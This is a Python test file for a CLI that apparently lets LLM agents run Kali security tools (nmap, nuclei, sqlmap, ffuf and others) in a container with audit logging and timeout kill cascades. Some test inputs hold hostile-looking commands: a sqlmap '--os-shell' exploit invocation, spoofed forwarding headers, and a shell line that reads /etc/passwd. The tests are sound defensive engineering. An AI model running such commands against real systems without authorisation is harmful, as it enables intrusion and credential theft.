"""Tests for the `aith assess kali` CLI command family.

Argparse round-trip plus mocked-helper coverage for the host-side execution
helper. The actual `docker exec` is never invoked in these tests — `kali_exec`
is monkeypatched to capture its call shape.
"""

from __future__ import annotations

import importlib
import json
import signal
import subprocess
import sys
from pathlib import Path
from types import ModuleType, SimpleNamespace

import pytest

_SCRIPTS_ROOT = Path(__file__).resolve().parents[3] / "agent" / "scripts"


@pytest.fixture(scope="module", autouse=True)
def _scripts_on_path():
    if str(_SCRIPTS_ROOT) not in sys.path:
        sys.path.insert(0, str(_SCRIPTS_ROOT))
    yield


@pytest.fixture(autouse=True)
def _reload_assess_modules():
    """Force-reload assess modules so monkeypatching sticks per test."""
    for mod in list(sys.modules):
        if mod == "assess" or mod.startswith("assess."):
            sys.modules.pop(mod, None)
    yield


def _import(name: str) -> ModuleType:
    return importlib.import_module(name)


# ──────────────────────────────────────────────────────────────────────────
# argparse round-trip tests
# ──────────────────────────────────────────────────────────────────────────


def test_kali_root_help_lists_every_verb(capsys):
    cli = _import("assess.cli")
    with pytest.raises(SystemExit):
        cli.main(["kali", "--help"])
    out = capsys.readouterr().out
    for verb in (
        "nmap-scan",
        "nuclei",
        "httpx",
        "wafw00f",
        "ffuf",
        "sqlmap",
        "subfinder",
        "puredns",
        "dnsx",
        "nikto",
        "katana",
        "gau",
        "whatweb",
        "cero",
        "alterx",
        "bbot",
        "exec",
        "job",
    ):
        assert verb in out, f"verb {verb} missing from kali --help"


@pytest.mark.parametrize(
    "verb,extra",
    [
        ("nmap-scan", ["--target", "x.example.com"]),
        ("nuclei", ["-u", "https://x.example.com"]),
        ("httpx", ["-u", "https://x.example.com"]),
        ("wafw00f", ["https://x.example.com"]),
        ("ffuf", ["-u", "https://x.example.com/FUZZ", "-w", "/lists/common.txt"]),
        ("sqlmap", ["-u", "https://x.example.com/?id=1"]),
        ("subfinder", ["-d", "example.com"]),
        ("puredns", ["bruteforce", "/lists/sub.txt", "example.com"]),
        ("dnsx", ["-l", "/lists/sub.txt"]),
        ("nikto", ["--host", "https://x.example.com"]),
        ("katana", ["-u", "https://x.example.com"]),
        ("gau", ["example.com"]),
        ("whatweb", ["https://x.example.com"]),
        ("cero", ["-d", "example.com"]),
        ("alterx", ["-d", "example.com"]),
        ("bbot", ["-t", "example.com"]),
    ],
)
def test_required_flag_enforcement(verb, extra):
    """Every typed verb must reject calls missing the audit lifecycle flags."""
    cli = _import("assess.cli")
    with pytest.raises(SystemExit) as exc:
        cli.main(["kali", verb, *extra])
    assert exc.value.code != 0


def test_required_flag_messages_name_missing_flags(capsys):
    cli = _import("assess.cli")
    with pytest.raises(SystemExit):
        cli.main(["kali", "nmap-scan", "--target", "x"])
    err = capsys.readouterr().err
    for flag in ("--technique", "--intent", "--probe-kind", "--phase", "--timeout"):
        assert flag in err, f"argparse error must call out missing {flag}"


@pytest.mark.parametrize(
    "verb,argv,expected_substrings",
    [
        (
            "nmap-scan",
            [
                "--target",
                "10.0.0.1",
                "--ports",
                "top-100",
                "--service-detection",
                "--technique",
                "RECON",
                "--intent",
                "phase-1 baseline",
                "--probe-kind",
                "fingerprint",
                "--phase",
                "recon",
                "--timeout",
                "600",
            ],
            ["nmap", "-sV", "--top-ports", "100", "10.0.0.1"],
        ),
        (
            "nuclei",
            [
                "-l",
                "hosts.txt",
                "-t",
                "http/cves/",
                "--technique",
                "RECON",
                "--intent",
                "reactive sweep",
                "--probe-kind",
                "fingerprint",
                "--phase",
                "recon",
                "--timeout",
                "1800",
            ],
            ["nuclei", "-l", "hosts.txt", "-t", "http/cves/"],
        ),
        (
            "httpx",
            [
                "-u",
                "https://x.example.com",
                "-tech-detect",
                "-tls-grab",
                "--technique",
                "RECON",
                "--intent",
                "fingerprint stack",
                "--probe-kind",
                "fingerprint",
                "--phase",
                "recon",
                "--timeout",
                "300",
            ],
            ["httpx", "-u", "https://x.example.com", "-tech-detect", "-tls-grab"],
        ),
        (
            "sqlmap",
            [
                "-u",
                "https://x.example.com/?id=1",
                "--batch",
                "--sql-technique",
                "BEUSTQ",
                "--technique",
                "SQLI",
                "--intent",
                "verify SQLi",
                "--probe-kind",
                "payload",
                "--phase",
                "consume-test",
                "--timeout",
                "1800",
            ],
            [
                "sqlmap",
                "-u",
                "https://x.example.com/?id=1",
                "--batch",
                "--technique=BEUSTQ",
            ],
        ),
    ],
)
def test_verb_translates_argv_into_underlying_command(
    monkeypatch, verb, argv, expected_substrings
):
    cli = _import("assess.cli")
    kali = _import("assess.lib.kali")

    captured: dict = {}

    def fake_kali_exec(cmd, **kwargs):
        captured["cmd"] = list(cmd)
        captured["kwargs"] = kwargs
        return kali.KaliResult(
            run_id=1,
            status="completed",
            return_code=0,
            stdout_path="/tmp/x.out",
            stderr_path="/tmp/x.err",
            duration_ms=10,
            peak_rss_bytes=None,
            stdout_preview="",
            stderr_preview="",
            timed_out=False,
            partial_results=False,
        )

    # Patch kali_exec on every command module that imports it.
    for module_name in (
        "assess.commands.kali_nmap",
        "assess.commands.kali_nuclei",
        "assess.commands.kali_httpx",
        "assess.commands.kali_sqlmap",
    ):
        mod = _import(module_name)
        monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)

    cli.main(["kali", verb, *argv])
    cmd = captured["cmd"]
    for token in expected_substrings:
        assert token in cmd, f"verb {verb} missing token {token!r} in cmd {cmd!r}"


@pytest.mark.parametrize(
    "verb,base_argv,expected_appended",
    [
        (
            "httpx",
            [
                "-u",
                "https://x.example.com",
                "-tech-detect",
                "--technique",
                "DISCOVERY",
                "--intent",
                "tech detect with custom headers",
                "--probe-kind",
                "fingerprint",
                "--phase",
                "recon",
                "--timeout",
                "60",
                "--extra-args",
                "-H 'X-Forwarded-For: 127.0.0.1' -mc 200",
            ],
            ["-H", "X-Forwarded-For: 127.0.0.1", "-mc", "200"],
        ),
        (
            "ffuf",
            [
                "-u",
                "https://x/FUZZ",
                "-w",
                "/lists/common.txt",
                "--technique",
                "FUZZ",
                "--intent",
                "fuzz with extra header",
                "--probe-kind",
                "payload",
                "--phase",
                "consume-test",
                "--timeout",
                "1800",
                "--extra-args",
                "-H 'X-Real-IP: 127.0.0.1' -t 50",
            ],
            ["-H", "X-Real-IP: 127.0.0.1", "-t", "50"],
        ),
        (
            "sqlmap",
            [
                "-u",
                "https://x/?id=1",
                "--batch",
                "--technique",
                "SQLI",
                "--intent",
                "sqli with os-shell",
                "--probe-kind",
                "exploit",
                "--phase",
                "exploit",
                "--timeout",
                "3600",
                "--destructive",
                "--extra-args",
                "--os-shell --tamper=space2comment",
            ],
            ["--os-shell", "--tamper=space2comment"],
        ),
    ],
)
def test_extra_args_appended_to_underlying_command(
    monkeypatch, verb, base_argv, expected_appended
):
    """argparse accepts --extra-args on typed verbs and the helper splits
    + appends the string to the underlying tool argv."""
    cli = _import("assess.cli")
    kali = _import("assess.lib.kali")

    captured: dict = {}

    def fake_kali_exec(cmd, **kwargs):
        captured["cmd"] = list(cmd)
        return kali.KaliResult(
            run_id=1,
            status="completed",
            return_code=0,
            stdout_path="/tmp/x.out",
            stderr_path="/tmp/x.err",
            duration_ms=10,
            peak_rss_bytes=None,
            stdout_preview="",
            stderr_preview="",
            timed_out=False,
            partial_results=False,
        )

    for module_name in (
        "assess.commands.kali_httpx",
        "assess.commands.kali_ffuf",
        "assess.commands.kali_sqlmap",
    ):
        mod = _import(module_name)
        monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)

    cli.main(["kali", verb, *base_argv])
    cmd = captured["cmd"]
    # The expected tokens must appear in the built argv, in order.
    assert all(tok in cmd for tok in expected_appended), (
        f"expected tokens {expected_appended!r} missing from cmd {cmd!r}"
    )
    # Sanity: shlex split worked — the single quoted segment is one token.
    if "X-Forwarded-For: 127.0.0.1" in expected_appended:
        assert "X-Forwarded-For: 127.0.0.1" in cmd
        assert "'X-Forwarded-For:" not in cmd  # no leftover single quotes


def test_extend_cmd_with_extra_args_shlex_splits():
    """Direct unit test on the helper: shlex-split + append."""
    kali = _import("assess.lib.kali")
    args = SimpleNamespace(extra_args="-H 'X-Forwarded-For: 127.0.0.1' -mc 200,302")
    cmd = ["httpx", "-u", "https://x"]
    out = kali.extend_cmd_with_extra_args(cmd, args)
    assert out is cmd  # mutates in place + returns
    assert cmd == [
        "httpx",
        "-u",
        "https://x",
        "-H",
        "X-Forwarded-For: 127.0.0.1",
        "-mc",
        "200,302",
    ]


def test_extend_cmd_with_extra_args_empty_is_noop():
    kali = _import("assess.lib.kali")
    args = SimpleNamespace(extra_args="")
    cmd = ["httpx", "-u", "https://x"]
    kali.extend_cmd_with_extra_args(cmd, args)
    assert cmd == ["httpx", "-u", "https://x"]
    # Also handles a Namespace with no attribute at all.
    bare = SimpleNamespace()
    kali.extend_cmd_with_extra_args(cmd, bare)
    assert cmd == ["httpx", "-u", "https://x"]


def test_hoist_root_flags_handles_either_position():
    """`--engagement-dir` and `--actor-kind` are root-parser flags and used
    to fail with `unrecognized arguments` when placed after the subcommand.
    1Z.17 fix hoists them to the front before parse_args, so operators can
    write `aith assess kali nmap-scan --engagement-dir <path>` interchangeably
    with the canonical front-position form. The hoist must stop at `--` so
    user-supplied argv to `kali exec`/`kali job start` is never mutated."""
    cli = _import("assess.cli")
    cases = [
        # canonical front position — unchanged
        (
            ["--engagement-dir", "/tmp/x", "fetch", "surfaces"],
            ["--engagement-dir", "/tmp/x", "fetch", "surfaces"],
        ),
        # hoist after kali verb
        (
            [
                "kali",
                "subfinder",
                "-d",
                "example.com",
                "--engagement-dir",
                "/tmp/x",
                "--technique",
                "RECON",
            ],
            [
                "--engagement-dir",
                "/tmp/x",
                "kali",
                "subfinder",
                "-d",
                "example.com",
                "--technique",
                "RECON",
            ],
        ),
        # hoist `--flag=value` form
        (
            ["kali", "subfinder", "--engagement-dir=/tmp/x", "-d", "example.com"],
            ["--engagement-dir=/tmp/x", "kali", "subfinder", "-d", "example.com"],
        ),
        # hoist actor-kind too
        (
            ["log", "operator", "msg", "--actor-kind", "agent"],
            ["--actor-kind", "agent", "log", "operator", "msg"],
        ),
        # do NOT hoist anything after `--` (would corrupt kali exec user argv)
        (
            ["kali", "exec", "--", "echo", "--engagement-dir", "foo"],
            ["kali", "exec", "--", "echo", "--engagement-dir", "foo"],
        ),
        # hoist legitimately before --, leave inner alone
        (
            [
                "kali",
                "exec",
                "--engagement-dir",
                "/tmp/x",
                "--",
                "echo",
                "--engagement-dir",
                "inner",
            ],
            [
                "--engagement-dir",
                "/tmp/x",
                "kali",
                "exec",
                "--",
                "echo",
                "--engagement-dir",
                "inner",
            ],
        ),
    ]
    for argv, expected in cases:
        assert cli._hoist_root_flags(argv) == expected, f"{argv!r}"


def test_derive_tool_name_handles_shell_wrappers():
    """`tool_bin` audit field must reflect the real tool when the LLM
    wraps the command in `bash -c '...'` — otherwise audit rows show
    `for`/`mkdir`/`>` and `list-command-runs --tool-bin <tool>` misses them."""
    kali = _import("assess.lib.kali")
    cases = [
        (["nmap", "-sV", "x"], "nmap"),
        (["bash", "-c", "mkdir x && for h in foo; do curl $h; done"], "mkdir"),
        (["sh", "-c", "for h in a b; do echo $h; done"], "echo"),
        (["bash", "-c", "while true; do nuclei -u https://x; done"], "nuclei"),
        (["bash", "-c", "if [ -f /etc/passwd ]; then cat /etc/passwd; fi"], "cat"),
        (["bash", "-c", "FOO=bar curl https://x"], "curl"),
        (["bash", "-c", "curl https://x > /tmp/out.html"], "curl"),
        (["bash", "-c", "2> /tmp/err.log nuclei -u x"], "nuclei"),
        (["/bin/bash", "-c", "> /tmp/out.txt"], "/bin/bash"),
        (["bash", "-c", "   "], "bash"),
        (["bash"], "bash"),
        ([], "command"),
    ]
    for cmd, expected in cases:
        assert kali._derive_tool_name(cmd) == expected, f"{cmd!r}"


def test_extra_args_not_exposed_on_kali_exec():
    """`kali exec` is already raw passthrough — it must not register the
    --extra-args flag, otherwise the LLM gets two ways to pass long-tail
    flags and the audit row's intent becomes ambiguous."""
    cli = _import("assess.cli")
    with pytest.raises(SystemExit) as exc:
        cli.main(
            [
                "kali",
                "exec",
                "--technique",
                "RECON",
                "--intent",
                "extra args probe",
                "--probe-kind",
                "baseline",
                "--phase",
                "recon",
                "--timeout",
                "60",
                "--extra-args",
                "-foo",
                "--",
                "curl",
                "https://x",
            ]
        )
    # argparse error exits with non-zero.
    assert exc.value.code != 0


def test_kali_exec_passthrough_carries_full_command(monkeypatch):
    cli = _import("assess.cli")
    kali = _import("assess.lib.kali")
    captured: dict = {}

    def fake_kali_exec(cmd, **kwargs):
        captured["cmd"] = list(cmd)
        captured["tool_name"] = kwargs.get("tool_name")
        return kali.KaliResult(
            run_id=2,
            status="completed",
            return_code=0,
            stdout_path="/tmp/y.out",
            stderr_path="/tmp/y.err",
            duration_ms=5,
            peak_rss_bytes=None,
            stdout_preview="",
            stderr_preview="",
            timed_out=False,
            partial_results=False,
        )

    mod = _import("assess.commands.kali_exec")
    monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)

    cli.main(
        [
            "kali",
            "exec",
            "--technique",
            "RECON",
            "--intent",
            "raw curl probe",
            "--probe-kind",
            "baseline",
            "--phase",
            "recon",
            "--timeout",
            "60",
            "--",
            "curl",
            "-sS",
            "https://example.com/health",
        ]
    )
    assert captured["cmd"] == ["curl", "-sS", "https://example.com/health"]
    assert captured["tool_name"] == "curl"


# ──────────────────────────────────────────────────────────────────────────
# kali_exec helper unit tests (mocked subprocess + AssessmentClient)
# ──────────────────────────────────────────────────────────────────────────


@pytest.fixture
def fake_engagement(tmp_path, monkeypatch):
    eng_dir = tmp_path / "engagements" / "2026-04-26-test"
    eng_dir.mkdir(parents=True, exist_ok=True)
    (eng_dir / "scope.json").write_text(json.dumps({"hostname": "example.com"}))
    (eng_dir / "auth.json").write_text(
        json.dumps({"kind": "cookies", "state": "present"})
    )
    monkeypatch.setenv("ENGAGEMENT_DIR", str(eng_dir))
    monkeypatch.setenv("AGENT_NAME", "vulnerability-analyst")
    return eng_dir


class _FakePopen:
    """Minimal Popen stand-in that mirrors what kali_exec uses."""

    def __init__(self, *, returncode=0, sleep=False):
        self.pid = 12345
        self._returncode = returncode
        self._sleep = sleep
        self._waits = 0

    def wait(self, timeout=None):
        self._waits += 1
        if self._sleep and self._waits == 1:
            raise subprocess.TimeoutExpired(cmd=["fake"], timeout=timeout)
        return self._returncode


@pytest.fixture(autouse=True)
def _stub_container_helpers(monkeypatch):
    """The B1 in-container kill cascade helpers shell out via
    ``subprocess.run`` to ``docker exec ...``. Tests that exercise the kali
    helper without a real runtime stub these to no-ops so the docker calls
    never fire and the tests stay container-independent. Tests that care
    about the kill-cascade behaviour override these explicitly."""
    try:
        kali = importlib.import_module("assess.lib.kali")
    except ModuleNotFoundError:
        yield
        return
    monkeypatch.setattr(kali, "_read_container_pid", lambda *_a, **_k: None)
    monkeypatch.setattr(kali, "_kill_in_container", lambda *_a, **_k: None)
    monkeypatch.setattr(kali, "_cleanup_container_pid_file", lambda *_a, **_k: None)
    yield


class _FakeClient:
    def __init__(self, base_url, engagement_key):
        self.base_url = base_url
        self.engagement_key = engagement_key
        self.posts: list[tuple[str, dict]] = []
        self.patches: list[tuple[str, dict]] = []

    def post(self, endpoint, payload):
        self.posts.append((endpoint, payload))
        return {"id": 7, "superseded_by_id": None}

    def patch(self, endpoint, payload, *, accept_409: bool = False):
        self.patches.append((endpoint, payload))
        return {"id": 7, "status": payload.get("status")}

    def close(self):
        return None


def _setup_fake_config(monkeypatch, eng_dir):
    """Wire load_config to return a Config rooted at eng_dir."""
    kali = _import("assess.lib.kali")

    def fake_load_config(_flag):
        return SimpleNamespace(
            base_url="http://127.0.0.1:18000",
            engagement_dir=str(eng_dir),
            engagement_key=eng_dir.name,
            agent_root=str(eng_dir.parent.parent),
        )

    monkeypatch.setattr(kali, "load_config", fake_load_config)
    return kali


def test_kali_exec_writes_pre_exec_row_then_finalizes(monkeypatch, fake_engagement):
    kali = _setup_fake_config(monkeypatch, fake_engagement)
    fake_client = _FakeClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali, "_check_container_running", lambda name: None)

    popen_call = {}

    def fake_popen(argv, **kwargs):
        popen_call["argv"] = argv
        popen_call["kwargs"] = kwargs
        # Verify stdout/stderr files are open BEFORE Popen returns.
        assert hasattr(kwargs["stdout"], "write"), "stdout must be an open file"
        assert hasattr(kwargs["stderr"], "write"), "stderr must be an open file"
        assert kwargs["start_new_session"] is True
        assert kwargs["shell"] is False
        return _FakePopen(returncode=0)

    monkeypatch.setattr(kali.subprocess, "Popen", fake_popen)

    result = kali.kali_exec(
        ["nmap", "-sV", "10.0.0.1"],
        technique="RECON",
        intent="phase-1 baseline",
        probe_kind="fingerprint",
        phase="recon",
        timeout=60,
        agent_name="recon-specialist",
        engagement_dir=fake_engagement,
        engagement_key=fake_engagement.name,
        tool_name="nmap",
    )
    assert result.status == "completed"
    assert result.return_code == 0
    assert result.run_id == 7

    # Pre-exec POST went out with status=running and full audit metadata.
    assert len(fake_client.posts) == 1
    endpoint, payload = fake_client.posts[0]
    assert endpoint == "command-runs"
    assert payload["status"] == "running"
    assert payload["technique"] == "RECON"
    assert payload["intent"] == "phase-1 baseline"
    assert payload["probe_kind"] == "fingerprint"
    assert payload["phase"] == "recon"
    assert payload["agent_name"] == "recon-specialist"
    assert payload["timeout_seconds_requested"] == 60
    assert payload["working_dir"] == f"/engagements/{fake_engagement.name}"
    assert payload["scope_version"]
    assert payload["auth_context"] == "cookies"
    # P1 schema fix: the CLI must propagate its engagement-wide run_uuid into
    # the POST so the backend's `run_uuid` column matches the wrapper pid file
    # key (`/tmp/aith-pid-<run_uuid>.pid`). Without this, sweep-orphans cannot
    # find the pid file from the DB column and falls back to regex-parsing
    # stdout_path — which breaks when the artifact dir is reconfigured.
    assert payload.get("run_uuid"), "CLI must propagate run_uuid into POST"
    # The run_uuid the CLI generated should also appear in the stdout_path so
    # legacy regex consumers keep working.
    assert payload["run_uuid"] in payload["stdout_path"]
    assert "-w" in popen_call["argv"]
    assert popen_call["argv"][popen_call["argv"].index("-w") + 1] == f"/engagements/{fake_engagement.name}"

    # Finalize PATCH followed.
    assert len(fake_client.patches) == 1
    patch_endpoint, patch_payload = fake_client.patches[0]
    assert patch_endpoint == "command-runs/7"
    assert patch_payload["status"] == "completed"
    assert patch_payload["return_code"] == 0
    assert patch_payload["timed_out"] is False


def test_kali_exec_timeout_kills_process_group_and_marks_timed_out(
    monkeypatch, fake_engagement
):
    kali = _setup_fake_config(monkeypatch, fake_engagement)
    fake_client = _FakeClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali, "_check_container_running", lambda name: None)

    killed_signals: list[int] = []

    def fake_killpg(pgid, sig):
        killed_signals.append(sig)

    def fake_getpgid(pid):
        return pid

    monkeypatch.setattr(kali.os, "killpg", fake_killpg)
    monkeypatch.setattr(kali.os, "getpgid", fake_getpgid)

    class _SlowPopen(_FakePopen):
        def __init__(self):
            super().__init__()
            self.calls = 0

        def wait(self, timeout=None):
            self.calls += 1
            if self.calls == 1:
                raise subprocess.TimeoutExpired(cmd=["fake"], timeout=timeout)
            return -signal.SIGTERM

    monkeypatch.setattr(kali.subprocess, "Popen", lambda *a, **k: _SlowPopen())

    # Simulate stdout/stderr having been written to so partial_results gets set.
    out_dir = fake_engagement / "scans" / "kali"
    out_dir.mkdir(parents=True, exist_ok=True)
    monkeypatch.setattr(kali, "_read_safely", lambda path: "partial bytes captured\n")

    result = kali.kali_exec(
        ["nuclei", "-l", "hosts.txt"],
        technique="RECON",
        intent="long-running sweep",
        probe_kind="fingerprint",
        phase="recon",
        timeout=1,
        agent_name="recon-specialist",
        engagement_dir=fake_engagement,
        engagement_key=fake_engagement.name,
        tool_name="nuclei",
    )
    assert result.timed_out is True
    assert result.status == "timed_out"
    assert result.partial_results is True

    # SIGTERM cascade fired.
    assert signal.SIGTERM in killed_signals

    # Finalize PATCH carried timed_out and partial_results.
    _, patch_payload = fake_client.patches[0]
    assert patch_payload["status"] == "timed_out"
    assert patch_payload["timed_out"] is True
    assert patch_payload["partial_results"] is True


def test_b1_docker_exec_wrapper_captures_in_container_pid(monkeypatch, fake_engagement):
    """B1: the docker-exec argv must wrap the user command in a tiny shell
    that records ``$$`` to ``/tmp/aith-pid-<run-uuid>.pid`` before ``exec``-ing
    the real command. Without this wrapper, the host helper has no way to
    address the in-container process across the PID namespace boundary, and
    SIGTERM-trapping tools (sqlmap, nuclei) survive the host-side process-group
    kill on timeout."""
    kali = _setup_fake_config(monkeypatch, fake_engagement)
    fake_client = _FakeClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali, "_check_container_running", lambda name: None)

    captured: dict = {}

    def fake_popen(argv, **kwargs):
        captured["argv"] = argv
        return _FakePopen(returncode=0)

    monkeypatch.setattr(kali.subprocess, "Popen", fake_popen)

    kali.kali_exec(
        ["nmap", "-sV", "10.0.0.1"],
        technique="RECON",
        intent="b1 wrapper shape",
        probe_kind="fingerprint",
        phase="recon",
        timeout=30,
        agent_name="recon-specialist",
        engagement_dir=fake_engagement,
        engagement_key=fake_engagement.name,
        tool_name="nmap",
    )
    argv = captured["argv"]
    # Shape: docker exec --env ENGAGEMENT_KEY=<key> -w <engagement-mount> <container> sh -c '<wrapper>' sh <user-cmd...>
    assert argv[:2] == ["docker", "exec"]
    assert argv[2:4] == ["--env", f"ENGAGEMENT_KEY={fake_engagement.name}"]
    assert argv[4:6] == ["-w", f"/engagements/{fake_engagement.name}"]
    container_index = argv.index("security-research")
    assert argv[container_index + 1:container_index + 3] == ["sh", "-c"]
    wrapper = argv[container_index + 3]
    assert wrapper.startswith("echo $$ > /tmp/aith-pid-"), wrapper
    # The PID-write race fix wraps the original `echo $$ > pidfile; exec "$@"`
    # in `&&`/`||` so a failed write logs to stderr and still execs. Both
    # branches must end in `exec "$@"` so the user command runs either way.
    assert '&& exec "$@"' in wrapper
    assert "|| (echo" in wrapper and "PID write to" in wrapper and "failed" in wrapper
    assert wrapper.count('exec "$@"') == 2
    # B1 race fix: `sync` between the pid-file write and `exec` flushes the
    # dirent so the host helper's `docker exec cat` cannot race and see an
    # empty file even when the in-container process is alive.
    assert "&& sync &&" in wrapper, (
        "wrapper must sync the pid-file write before exec to prevent the host "
        "helper racing on an empty dirent"
    )
    # ``sh`` placeholder makes ``$@`` skip the script-name positional.
    assert argv[container_index + 4] == "sh"
    assert argv[container_index + 5:] == ["nmap", "-sV", "10.0.0.1"]


def test_b1_timeout_cascade_kills_in_container_pid_then_host_pgid(
    monkeypatch, fake_engagement
):
    """B1: on wall-clock timeout, the helper must read the wrapper-recorded
    PID and send ``docker exec kill -TERM <pid>`` (and then ``-KILL`` if the
    process survives the 5s grace) so the in-container tool tree dies even
    when SIGTERM is trapped. The host-side ``os.killpg`` cascade still fires
    as belt-and-braces, and the pid file is removed afterwards so /tmp does
    not accumulate leftovers."""
    kali = _setup_fake_config(monkeypatch, fake_engagement)
    fake_client = _FakeClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali, "_check_container_running", lambda name: None)

    # Capture the actual pid the wrapper wrote, plus all docker-exec / host-side
    # kill activity so we can assert the full cascade order.
    monkeypatch.setattr(kali, "_read_container_pid", lambda *a, **k: 4242)

    docker_kills: list[tuple[str, int]] = []
    monkeypatch.setattr(
        kali,
        "_kill_in_container",
        lambda container, pid, sig: docker_kills.append((sig, pid)),
    )

    cleanups: list[str] = []
    monkeypatch.setattr(
        kali,
        "_cleanup_container_pid_file",
        lambda container, run_uuid: cleanups.append(run_uuid),
    )

    host_signals: list[int] = []
    monkeypatch.setattr(kali.os, "killpg", lambda pgid, sig: host_signals.append(sig))
    monkeypatch.setattr(kali.os, "getpgid", lambda pid: pid)

    class _SlowPopen(_FakePopen):
        def __init__(self):
            super().__init__()
            self.calls = 0

        def wait(self, timeout=None):
            self.calls += 1
            # First wait → timeout (forces SIGTERM cascade).
            # Second wait (after SIGTERM) → also timeout (forces SIGKILL).
            # Third wait (after SIGKILL) → return code.
            if self.calls in (1, 2):
                raise subprocess.TimeoutExpired(cmd=["fake"], timeout=timeout)
            return -signal.SIGKILL

    monkeypatch.setattr(kali.subprocess, "Popen", lambda *a, **k: _SlowPopen())
    monkeypatch.setattr(kali, "_read_safely", lambda path: "")

    kali.kali_exec(
        ["sqlmap", "-u", "https://x/?id=1", "--batch"],
        technique="SQLI",
        intent="b1 cascade",
        probe_kind="payload",
        phase="consume-test",
        timeout=1,
        agent_name="vulnerability-analyst",
        engagement_dir=fake_engagement,
        engagement_key=fake_engagement.name,
        tool_name="sqlmap",
    )

    # Both cross-namespace kills landed at the captured in-container PID.
    assert ("TERM", 4242) in docker_kills
    assert ("KILL", 4242) in docker_kills
    # Host-side belt-and-braces fired both signals too.
    assert signal.SIGTERM in host_signals
    assert signal.SIGKILL in host_signals
    # The pid file was cleaned up so /tmp doesn't leak.
    assert len(cleanups) == 1


def test_b1_timeout_without_pid_file_uses_host_kill_only(
    monkeypatch, fake_engagement, capsys
):
    """B1 edge: when the wrapper hadn't written the pid file yet (race) or
    the container is gone (read fails), the helper must log a warning and
    still issue the host-side process-group kill cascade rather than crash.
    """
    kali = _setup_fake_config(monkeypatch, fake_engagement)
    fake_client = _FakeClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali, "_check_container_running", lambda name: None)

    monkeypatch.setattr(kali, "_read_container_pid", lambda *a, **k: None)
    docker_kills: list[tuple[str, int]] = []
    monkeypatch.setattr(
        kali,
        "_kill_in_container",
        lambda container, pid, sig: docker_kills.append((sig, pid)),
    )

    def fail_if_pkill_fallback_runs(*_args, **_kwargs):
        raise AssertionError("timeout cleanup must not use argv-based pkill fallback")

    monkeypatch.setattr(
        kali, "_pkill_in_container_by_argv", fail_if_pkill_fallback_runs, raising=False
    )

    host_signals: list[int] = []
    monkeypatch.setattr(kali.os, "killpg", lambda pgid, sig: host_signals.append(sig))
    monkeypatch.setattr(kali.os, "getpgid", lambda pid: pid)

    class _SlowPopen(_FakePopen):
        def __init__(self):
            super().__init__()
            self.calls = 0

        def wait(self, timeout=None):
            self.calls += 1
            if self.calls == 1:
                raise subprocess.TimeoutExpired(cmd=["fake"], timeout=timeout)
            return -signal.SIGTERM

    monkeypatch.setattr(kali.subprocess, "Popen", lambda *a, **k: _SlowPopen())
    monkeypatch.setattr(kali, "_read_safely", lambda path: "")

    kali.kali_exec(
        ["nuclei", "-l", "hosts.txt"],
        technique="RECON",
        intent="b1 missing pid file fallback",
        probe_kind="fingerprint",
        phase="recon",
        timeout=1,
        agent_name="recon-specialist",
        engagement_dir=fake_engagement,
        engagement_key=fake_engagement.name,
        tool_name="nuclei",
    )

    err = capsys.readouterr().err
    assert "in-container pid file missing" in err
    assert "pkill" not in err
    assert docker_kills == []  # no pid-targeted in-container kill possible
    assert signal.SIGTERM in host_signals  # host-side cascade still fired


@pytest.mark.integration
def test_b1_orphan_cleanup_via_live_runtime():
    """B1 end-to-end acceptance test (W1-A from the wave plan).

    Skipped by default — runs only with ``pytest -m integration`` against a
    live runtime. The operator runs this manually after the runtime image is
    rebuilt with the SYS_PTRACE cap-add (B2) so the kill cascade can be
    validated end-to-end.

    Flow:
    1. Spawn a long-running ``nmap -p 1-65535 127.0.0.1`` via ``aith assess kali``.
    2. Force a wall-clock timeout (``--timeout 2``).
    3. After timeout, ``docker exec security-research pgrep -af nmap`` MUST
       return no rows. Before the B1 fix, nmap survived because dockerd's
       SIGTERM forwarding raced with nmap's signal handlers.
    """
    import shutil
    import time as _time

    if shutil.which("docker") is None:
        pytest.skip("docker CLI not on PATH")
    container = "security-research"
    health = subprocess.run(
        ["docker", "ps", "--format", "{{.Names}}", "--filter", f"name=^{container}$"],
        check=False,
        capture_output=True,
        text=True,
        timeout=10,
    )
    if container not in (health.stdout or "").splitlines():
        pytest.skip(f"runtime container '{container}' is not running")

    aith = shutil.which("aith")
    if aith is None:
        pytest.skip("aith CLI not on PATH")

    proc = subprocess.run(
        [
            aith,
            "assess",
            "kali",
            "exec",
            "--technique",
            "RECON",
            "--intent",
            "B1 orphan-cleanup acceptance test",
            "--probe-kind",
            "fingerprint",
            "--phase",
            "recon",
            "--timeout",
            "2",
            "--",
            "nmap",
            "-p",
            "1-65535",
            "127.0.0.1",
        ],
        check=False,
        capture_output=True,
        text=True,
        timeout=60,
    )
    # 2s of grace for any cleanup straggler to exit.
    _time.sleep(2)
    pgrep = subprocess.run(
        ["docker", "exec", container, "pgrep", "-af", "nmap"],
        check=False,
        capture_output=True,
        text=True,
        timeout=10,
    )
    assert pgrep.returncode != 0, (
        f"nmap orphans survived inside container after timeout:\n"
        f"aith stdout: {proc.stdout}\naith stderr: {proc.stderr}\n"
        f"pgrep stdout: {pgrep.stdout}"
    )


@pytest.mark.integration
def test_b1_timeout_kills_sigterm_trapping_in_container_pid():
    """B1 SIGKILL-fallback acceptance test against a SIGTERM-trapping victim.
    Spawns ``trap '' TERM; exec sleep 600`` so only the cascade's SIGKILL leg
    (``docker exec kill -9`` against the wrapper-recorded PID) can reap it."""
    import shutil
    import time as _time

    if shutil.which("docker") is None:
        pytest.skip("docker CLI not on PATH")
    container = "security-research"
    health = subprocess.run(
        ["docker", "ps", "--format", "{{.Names}}", "--filter", f"name=^{container}$"],
